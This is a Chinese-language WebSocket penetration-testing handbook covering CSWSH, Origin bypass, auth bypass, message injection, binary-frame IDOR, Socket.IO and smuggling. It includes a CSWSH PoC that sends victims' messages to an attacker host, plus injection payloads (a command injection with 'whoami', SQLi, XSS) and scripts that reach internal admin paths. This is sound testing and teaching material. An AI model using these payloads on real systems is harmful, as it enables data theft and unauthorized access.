---

phase: webapp
vuln_class: [websocket]
title: WebSocket 安全测试手册
summary: WebSocket 测试：握手/Origin/CSWSH/注入主线 + 走私等加深。
---

> 结构：上半原有是主线（握手 / Origin / CSWSH / 注入）；下半补充加深（走私、Socket.IO）。短表没点名时先握手+越权消息。
>
> 与 `src-value-hunting` 冲突时以 rules 为准。仅 Origin 缺失、没有读到/改到他人数据 → 默认不写。

# WebSocket 安全测试手册

## 0. 判据速查

| 现象 | 测试 | 判据 |
|---|---|---|
| 流量里有 `101 Switching Protocols` | 握手审查 | `Origin` 是否校验、token 是否在 URL |
| 换 `Origin` 仍 101 | CSWSH | 需结合 SameSite 判断能否真正带上会话 |
| 会话 cookie `SameSite=Lax/Strict` | CSWSH 不成立 | WebSocket 升级不算顶层导航，Lax 不发 |
| 连上即可收发，无 token | 认证缺失 | 直接读他人数据才算成 |
| 消息体是 JSON 且服务端拼接 | 注入 / 越权 | 改 `userId`、`role`、`targetUserId` |
| 帧是二进制 | protobuf/msgpack 改字段 | 解码 → 改 → 重编码，服务端不复校验即中 |
| 反代禁了 `/admin` 但放行 `/ws` | 走私 | 升级后是否变裸 TCP 透传 |
| 用 Socket.IO | 命名空间/事件名/ack | 非默认命名空间是否也校验权限 |
| 轮询降级可用 | CSRF | `transport=polling` 走普通 HTTP 带 cookie |
| 生产用 `ws://` | 中间人注入 | 同网段可插帧 |

---

## 1. 识别与握手

### 1.1 握手报文

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
Origin: https://target.com
```

成功响应：

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

`Sec-WebSocket-Accept` = base64(SHA1(key + `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`))。握手完成后是帧（text/binary、ping/pong、close）。

### 1.2 找端点

```bash
grep -r "new WebSocket" *.js
grep -r "ws://" *.js
grep -r "wss://" *.js
```

Burp / DevTools 里过滤 `101` 与 `Upgrade: websocket`；API 层的鉴权模型对齐走 `api-sec`。

**先记三件事**：`wss` 还是 `ws`；认证放在哪（URL 参数 / Cookie / `Sec-WebSocket-Protocol` / 首条消息）；消息是 JSON 还是二进制。

---

## 2. Origin 与 CSWSH

### 2.1 成立条件

两条同时满足才有 CSWSH：

1. 握手时**不校验 `Origin`**（或校验可绕）；
2. 受害者对该站有**活跃会话**，且该 cookie 会被升级请求带上。

### 2.2 Origin 绕过测试

```python
import websocket

for origin in ["https://attacker.com", "https://target.com.attacker.com",
               "https://attacker.com.target.com", "null", "",
               "https://target.com:@attacker.com"]:
    try:
        ws = websocket.create_connection(url, header=[f"Origin: {origin}"])
        print("[+] 通过:", origin, ws.recv()[:100]); ws.close()
    except Exception as e:
        print("[-] 拒绝:", origin, str(e)[:50])
```

```bash
websocat -H "Origin: https://attacker.com" wss://target.com/chat
wscat -c wss://target.com/chat --origin https://attacker.com
```

`Origin: null`、子域后缀、`@` 混淆是四个高频漏点。

### 2.3 cookie 到底会不会带上（决定危害）

| cookie 属性 | 升级请求是否携带 |
|---|---|
| 无 `SameSite`（老式） | 现代 Chrome 按 Lax 处理；老浏览器按 None |
| `SameSite=None`（需 `Secure`） | 会 |
| `SameSite=Lax` | **不会**——WebSocket 升级不属于顶层导航 |
| `SameSite=Strict` | 不会 |

所以「Origin 不校验」只是必要条件。若会话 cookie 是 Lax，CSWSH 打不动，别写成漏洞。

### 2.4 PoC

```html
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send(JSON.stringify({action: 'get_profile'}));
  ws.send(JSON.stringify({action: 'list_messages'}));
};
ws.onmessage = e => fetch('https://attacker.com/collect', {method:'POST', body:e.data});
</script>
```

**读写都要测**：读（私信、余额、管理命令输出）与写（转账、改设置、以受害者身份发消息）是两种危害，报告里分开写。

### 2.5 服务端加固对照

缺 `Origin` 校验 → CSWSH；token 放 URL（`?access_token=`）→ 日志/代理/Referer/历史记录泄漏；无速率限制 → 爆破与 DoS；`ws://` → 明文可 MITM。推荐 `Sec-WebSocket-Protocol` 带 token、首条消息认证、或 cookie + CSRF token。

---

## 3. 认证与会话绑定

四种认证位置都要试一遍绕过：

```text
1. URL 参数：wss://target.com/chat?token=xxx
2. Cookie：握手时自动发送
3. 自定义头：Sec-WebSocket-Protocol: token.xxx
4. 首条消息：{"type":"auth","token":"xxx"}
```

- **无认证**：不带任何凭据直连，能收到别人数据才算成。
- **token 重放**：用已注销/过期的 token 连，仍成功即可重放。
- **会话串号**：Burp 里换成另一个用户的 cookie jar 重连，比对订阅主题与返回数据。

---

## 4. 消息层

### 4.1 JSON 注入与越权

同一套 payload 分类套到 WS 上：

```text
XSS      {"type":"message","content":"<script>alert(1)</script>"}
SQLi     {"type":"search","query":"test' OR '1'='1"}
命令注入  {"type":"ping","host":"127.0.0.1; whoami"}
NoSQL    {"type":"message","userId":{"$ne":null}}
越权     {"type":"message","targetUserId":"VICTIM_ID"}
```

**服务端拼接 JSON** 时可直接插字段：`msg = '","admin":true,"msg":"x'` 拼进 `{"user":"u","msg":"%s"}` 后多出 `admin` 键。

**存储型 XSS**：消息存库并广播给所有在线客户端，客户端按 HTML 渲染 → 一次发送打全部在线用户。

### 4.2 二进制帧

```bash
echo "$CAPTURED_HEX" | xxd -r -p | protoc --decode_raw
```

```python
import msgpack, websocket
ws = websocket.create_connection('wss://target.com/ws')
data = msgpack.unpackb(ws.recv(), raw=False)   # {'action':'get_balance','user_id':123}
data['user_id'] = 1                             # IDOR
ws.send(msgpack.packb(data), opcode=0x2)
```

**类型混淆**：`user_id` 从整数改成字符串 `"1 OR 1=1"`（protobuf 字段类型 0 → 2）；`is_admin` 从 `0x00` 改 `0x01`。服务端反序列化后不复校验即中。

畸形/超长帧（`\x00\x00\x00\x01`、`b"\xff"*1000`、10KB+）用来探解析器崩溃与长度校验。

---

## 5. Socket.IO 专属

| 面 | 测法 |
|---|---|
| 命名空间 | 默认命名空间有鉴权，但 `/admin` 没有 → `io('https://target.com/admin')` 直连后 `emit('list_users')` |
| 事件名注入 | 服务端 `socket.on(userInput, handler)` 时，发 `__disconnect`、`connection`、`error` 触发内部处理器 |
| ack 回调 | `emit('get_data', {id:'admin'}, cb)` 的 `cb` 可能返回越权数据 |
| 轮询降级 CSRF | 无 WS 时走 HTTP 长轮询，带 cookie → `POST /socket.io/?EIO=4&transport=polling&sid=...` 直接发事件 |

---

## 6. WebSocket 走私

**原理**：反代在 `101` 之后可能停止检查、转为裸 TCP 透传，于是可以把任意 HTTP 塞进「WebSocket」连接。

```text
1. 反代对 /admin 返回 403
2. 客户端对 /ws 发合法升级 → 101
3. 升级后反代不再解析
4. 在连接里发裸 HTTP：
   GET /admin HTTP/1.1
   Host: internal-backend
5. 后端按 HTTP 处理 → 200
```

```python
import websocket, ssl
ws = websocket.create_connection('wss://target.com/ws',
        header=['Origin: https://target.com'], sslopt={"cert_reqs": ssl.CERT_NONE})
ws.send(b"GET /admin/users HTTP/1.1\r\nHost: internal-backend\r\nConnection: close\r\n\r\n", opcode=0x2)
print(ws.recv())
```

**H2 变体**：升级后发 HTTP/2 preface，绕过只解析 HTTP/1.1 的 WAF。

| 代理 | 升级后行为 |
|---|---|
| Nginx | 裸 TCP 透传，后端不校验 WS 帧则可走私 |
| HAProxy | 看 `option http-server-close` 还是 `tunnel` 模式 |
| AWS ALB | 终止 WebSocket 并重组帧，较难 |
| Cloudflare | 检查 WS 帧，裸 HTTP 走私被挡 |
| Varnish | 原生不支持 WebSocket，升级可能直接绕过缓存 |

---

## 7. 信息泄露与 DoS（谨慎）

**消息监控**：连上后持续收帧，按正则扫信用卡号、SSN、邮箱、手机号、`password`/`token`/`secret`。用 `js-reverse` 的 `get_websocket_messages` 可直接拿全量消息再离线分析。

**DoS 只在授权范围做**：大量并发连接、单条 10MB 消息、每秒 1 字节的慢速握手。多数众测规则禁止，先确认 scope。

---

## 8. 工具

```bash
# websocat
websocat -H "Origin: https://attacker.com" wss://target.com/chat
cat payload.json | websocat wss://target.com/chat
websocat wss://target.com/chat > messages.txt

# wscat
wscat -c wss://target.com/chat --origin https://attacker.com
wscat -c wss://target.com/chat -H "Authorization: Bearer TOKEN"

# wsrepl（可带插件复现 cookie / token 刷新）
pip install wsrepl && wsrepl -u wss://target.com/ws -P auth_plugin.py

# ws-harness（把 WS 桥成 HTTP，给 sqlmap 之类用）
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

Burp 生态：**SocketSleuth**（帧级查看与改写）、**WebSocket Turbo Intruder**（高频/脚本化 fuzz）。二进制分析：`protobuf-inspector`、`msgpack-tools`、`wsdump`、Wireshark 的 WebSocket dissector。

---

## 9. 纪律

- **先握手后越权**：拿到 `101` 不等于有洞；判据是「能否读到/改到他人数据」。
- CSWSH 必须同时确认 Origin 未校验 **和** 会话 cookie 会随升级请求发送；`SameSite=Lax` 直接否掉。
- 认证四位置（URL / Cookie / 子协议头 / 首条消息）逐个试绕过，URL 带 token 本身算信息泄漏点。
- 二进制帧一定要解出来看字段语义，IDOR 与类型混淆都藏在字段类型里。
- 走私的判据是「反代升级后是否还解析」；先确认反代类型，再看后端是否校验 WS 帧。
- Socket.IO 的命名空间鉴权、事件名注入、ack 回调、轮询降级是四个独立面，别只测默认命名空间。
- `ws://` 出现在生产环境本身就是一条发现（明文、可 MITM 插帧），不必等利用成功。
- DoS 类测试先看授权范围，能不测就不测。
